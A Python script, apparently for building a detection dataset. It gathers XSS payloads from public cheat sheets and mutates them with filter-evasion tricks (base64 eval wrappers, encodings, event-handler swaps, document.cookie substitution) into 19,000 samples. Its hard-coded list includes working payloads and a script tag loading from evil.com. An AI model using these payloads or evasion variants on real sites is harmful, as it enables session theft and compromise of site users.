import requests
import random
import base64
import urllib.parse
from bs4 import BeautifulSoup
import csv

# Sample payloads (expanded for variety)
base_payloads = [
    "<script>alert('xss')</script>",              # Stored XSS
    "<img src='x' onerror='alert(1)'>",           # DOM-based XSS
    "<div onmouseover='alert(1)'>Hover</div>",    # DOM-based XSS
    "<a href='javascript:alert(1)'>Click</a>",    # DOM-based XSS
    "<iframe src='javascript:alert(1)'></iframe>",# DOM-based XSS
    "<input type='text' onfocus='alert(1)'>",     # DOM-based XSS
    "<svg onload='alert(1)'>",                    # DOM-based XSS
    "?param=<script>alert(1)</script>",           # Reflected XSS
    "<script src='http://evil.com/xss.js'></script>"  # Stored XSS
]

# Common XSS event handlers
xss_events = [
    "onafterprint",
    "onafterscriptexecute",
    "onanimationcancel",
    "onanimationend",
    "onanimationiteration",
    "onanimationstart",
    "onauxclick",
    "onbeforecopy",
    "onbeforecut",
    "onbeforeinput",
    "onbeforeprint",
    "onbeforescriptexecute",
    "onbeforetoggle",
    "onbeforeunload",
    "onbegin",
    "onblur",
    "oncancel",
    "oncanplay",
    "oncanplaythrough",
    "onchange",
    "onclick",
    "onclose",
    "oncontentvisibilityautostatechange",
    "oncontextmenu",
    "oncopy",
    "oncuechange",
    "oncut",
    "ondblclick",
    "ondrag",
    "ondragend",
    "ondragenter",
    "ondragexit",
    "ondragleave",
    "ondragover",
    "ondragstart",
    "ondrop",
    "ondurationchange",
    "onend",
    "onended",
    "onerror",
    "onfocus",
    "onfocusin",
    "onfocusout",
    "onformdata",
    "onfullscreenchange",
    "onhashchange",
    "oninput",
    "oninvalid",
    "onkeydown",
    "onkeypress",
    "onkeyup",
    "onload",
    "onloadeddata",
    "onloadedmetadata",
    "onloadstart",
    "onmessage",
    "onmousedown",
    "onmouseenter",
    "onmouseleave",
    "onmousemove",
    "onmouseout",
    "onmouseover",
    "onmouseup",
    "onmousewheel",
    "onmozfullscreenchange",
    "onpagehide",
    "onpageshow",
    "onpaste",
    "onpause",
    "onplay",
    "onplaying",
    "onpointercancel",
    "onpointerdown",
    "onpointerenter",
    "onpointerleave",
    "onpointermove",
    "onpointerout",
    "onpointerover",
    "onpointerrawupdate",
    "onpointerup",
    "onpopstate",
    "onprogress",
    "onratechange",
    "onrepeat",
    "onreset",
    "onresize",
    "onscroll",
    "onscrollend",
    "onscrollsnapchange",
    "onsearch",
    "onseeked",
    "onseeking",
    "onselect",
    "onselectionchange",
    "onselectstart",
    "onshow",
    "onsubmit",
    "onsuspend",
    "ontimeupdate",
    "ontoggle",
    "ontouchend",
    "ontouchmove",
    "ontouchstart",
    "ontransitioncancel",
    "ontransitionend",
    "ontransitionrun",
    "ontransitionstart",
    "onunhandledrejection",
    "onunload",
    "onvolumechange",
    "onwaiting",
    "onwebkitanimationend",
    "onwebkitanimationiteration",
    "onwebkitanimationstart",
    "onwebkitfullscreenchange",
    "onwebkitmouseforcechanged",
    "onwebkitmouseforcedown",
    "onwebkitmouseforceup",
    "onwebkitmouseforcewillbegin",
    "onwebkitplaybacktargetavailabilitychanged",
    "onwebkitpresentationmodechanged",
    "onwebkittransitionend",
    "onwebkitwillrevealbottom",
    "onwheel"
]

def fetch_payloads_from_owasp():
    url = "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        payloads = []
        for element in soup.find_all(['pre', 'code', 'p']):
            text = element.get_text(strip=True)
            if any(kw in text.lower() for kw in ['script', 'onerror', 'onload', 'javascript:', '<img', '<svg']):
                if '<' in text and '>' in text:
                    payloads.append(text)
        return [p.strip() for p in payloads if len(p.strip()) > 5 and '<' in p]
    except Exception as e:
        print(f"Error fetching OWASP payloads: {e}")
        return []

def fetch_payloads_from_payloadsallthethings():
    base_url = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/"
    intruders_url = f"{base_url}Intruders/"
    main_files = [
        "README.md", "1%20-%20XSS%20Filter%20Bypass.md", "2%20-%20XSS%20Polyglot.md",
        "3%20-%20XSS%20Common%20WAF%20Bypass.md", "4%20-%20CSP%20Bypass.md", "5%20-%20XSS%20in%20Angular.md"
    ]
    intruders_files = [
        "0xcela_event_handlers.txt", "BRUTELOGIC-XSS-JS.txt", "BRUTELOGIC-XSS-STRINGS.txt",
        "IntrudersXSS.txt", "JHADDIX_XSS.txt", "MarioXSSVectors.txt", "RSNAKE_XSS.txt",
        "XSSDetection.txt", "XSS_Polyglots.txt", "jsonp_endpoint.txt",
        "port_swigger_xss_cheatsheet_event_handlers.txt", "xss_alert.txt",
        "xss_alert_identifiable.txt", "xss_payloads_quick.txt", "xss_swf_fuzz.txt"
    ]
    payloads = []
    for file_name in main_files:
        url = f"{base_url}{file_name}"
        try:
            response = requests.get(url, timeout=5)
            response.raise_for_status()
            lines = response.text.splitlines()
            for line in lines:
                line = line.strip()
                if '<' in line and '>' in line and any(kw in line.lower() for kw in ['script', 'on', 'javascript:', 'alert']):
                    payloads.append(line)
        except Exception as e:
            print(f"Error fetching {file_name} from PayloadsAllTheThings: {e}")
    for file_name in intruders_files:
        url = f"{intruders_url}{file_name}"
        try:
            response = requests.get(url, timeout=5)
            response.raise_for_status()
            lines = response.text.splitlines()
            for line in lines:
                line = line.strip()
                if line and any(kw in line.lower() for kw in ['script', 'on', 'javascript:', 'alert', '<', '>']):
                    payloads.append(line)
        except Exception as e:
            print(f"Error fetching {file_name} from PayloadsAllTheThings/Intruders: {e}")
    return payloads if payloads else []

def fetch_payloads_from_xssed():
    url = "http://xssed.com/archive/"
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        payloads = []
        for element in soup.find_all(['pre', 'code', 'td', 'div', 'span']):
            text = element.get_text(strip=True)
            if any(kw in text.lower() for kw in ['script', 'onerror', 'onload', 'javascript:', '<img', '<svg', 'alert']):
                if '<' in text and '>' in text:
                    payloads.append(text)
        return [p.strip() for p in set(payloads) if len(p.strip()) > 5]
    except Exception as e:
        print(f"Error fetching XSSed payloads: {e}")
        return []

def fetch_payloads_from_local_files(file1="payloads1.txt", file2="payloads2.txt"):
    payloads = []
    for file_name in [file1, file2]:
        try:
            with open(file_name, 'r', encoding='utf-8') as f:
                lines = f.read().splitlines()
                for line in lines:
                    line = line.strip()
                    if line:  # Only add non-empty lines
                        payloads.append(line)
        except FileNotFoundError:
            print(f"Warning: Could not find {file_name}. Skipping...")
        except Exception as e:
            print(f"Error reading {file_name}: {e}")
    return payloads if payloads else []

def alternate_case(text):
    return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(text))

def url_encode_words(text):
    import re
    words = re.split(r'([<>= ]+)', text)
    result = []
    for word in words:
        if random.choice([True, False]) and word.strip() and not word.startswith('<') and not word.endswith('>'):
            result.append(urllib.parse.quote(word))
        else:
            result.append(word)
    return ''.join(result)

def augment_payloads(payloads, target_size=5000, max_len=None):
    malicious_samples = set(payloads)  # Use set to avoid duplicates
    while len(malicious_samples) < target_size:
        base = random.choice(payloads)
        variants = [
            base.lower(),                                  # All lowercase
            base.upper(),                                  # All uppercase
            alternate_case(base),                          # Alternate case
            f"<script>eval(atob('{base64.b64encode(base.encode()).decode()}'))</script>",  # Base64 encoded
            urllib.parse.quote(base),                      # Full URL encoded
            url_encode_words(base),                        # Selective URL encoding of words
            base.replace('script', 'scrIpt'),              # Case variation
            base.replace('alert', 'confirm'),              # Function swap
            base.replace('1', 'document.cookie'),          # Payload variation
            base.replace(random.choice(xss_events), random.choice(xss_events)),  # Event swap
            f"{base[:5]}<!-->{base[5:]}",                 # Comment injection
            base.replace(' ', '%20'),                      # URL encoding (spaces only)
            base.replace('<', '<').replace('>', '>'),  # HTML entity encoding
            f"<script>'{base[:len(base)//2]}'+'{base[len(base)//2:]}'</script>"  # JS string concatenation
        ]
        for variant in variants:
            if max_len is None or len(variant) <= max_len:
                malicious_samples.add(variant)
            if len(malicious_samples) >= target_size:
                break
    malicious_samples = list(malicious_samples)
    random.shuffle(malicious_samples)
    return malicious_samples[:target_size]

# Collect payloads from all sources
owasp_payloads = fetch_payloads_from_owasp()
pat_payloads = fetch_payloads_from_payloadsallthethings()
xssed_payloads = fetch_payloads_from_xssed()
local_payloads = fetch_payloads_from_local_files("../../Cheatsheet/portswigger_cheatsheet.txt", "../../Cheatsheet/xss_vectors_kurobeats.txt")

if not owasp_payloads:
    print("Warning: No OWASP payloads fetched.")
if not pat_payloads:
    print("Warning: No PayloadsAllTheThings payloads fetched.")
if not xssed_payloads:
    print("Warning: No XSSed payloads fetched.")
if not local_payloads:
    print("Warning: No local file payloads fetched.")

# Combine all payloads
base_payloads.extend(owasp_payloads)
base_payloads.extend(pat_payloads)
base_payloads.extend(xssed_payloads)
base_payloads.extend(local_payloads)
malicious_samples = augment_payloads(base_payloads, target_size=19000, max_len=None)

# Output results
print(f"Collected {len(malicious_samples)} malicious samples")
for sample in malicious_samples[:5]:
    print(sample)

writer = csv.writer(open("./xss_payloads.csv", "w"))
for sample in malicious_samples:
    writer.writerow([sample])   

print("Payloads saved to 'xss_payloads.txt'")